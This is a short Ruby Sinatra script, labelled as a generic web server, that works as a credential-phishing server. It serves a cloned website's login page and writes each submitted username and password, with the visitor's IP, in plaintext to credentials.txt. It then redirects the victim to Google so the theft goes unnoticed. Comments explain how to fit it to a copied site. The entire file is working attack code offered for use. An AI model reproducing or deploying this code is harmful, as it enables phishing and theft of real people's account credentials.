#!/usr/bin/env ruby
# Generic Web Server
# Requirements:
#   gem install sinatra rerun
#   apt-get install build-essential libsqlite3-dev
#   rerun 'ruby login.rb'
#
require 'bundler/inline'

begin
  require 'sinatra'
  require 'logger'
rescue => exception
  gemfile do
    source 'https://rubygems.org'
    gem 'sinatra', require: 'sinatra'
  end
end

file = 'credentials.txt'
logger = Logger.new(file)
logger.formatter = proc do |severity, datetime, progname, msg|
  "#{datetime.strftime('%Y-%m-%d %H:%M')} | #{msg}\n"
end

configure {
  set :port, 8181
  set :environment, :production
  set :public_folder, File.dirname(__FILE__) + '/views'
  set :show_exceptions, false
}
enable :sessions

# Put your cloned website under 'views' directory 
get '/' do
  erb 'PATH/TO/LOGIN_PAGE'.to_sym
end


post '/login' do
  if params['UserName'] && params['Password']   # Find the parameter's input id from your cloned website
    username = params['UserName']
    password = params['Password']
    ip_addr  = @env['HTTP_X_REAL_IP']           # request.env['REMOTE_ADDR'].split(',').first
    logger.info(username +':'+ password +':'+ ip_addr)
    redirect 'https://google.com'               # Redirect user to google After submitting the form
  else
    erb '/'.to_sym
  end
end

not_found do
  redirect '/'.to_sym
end
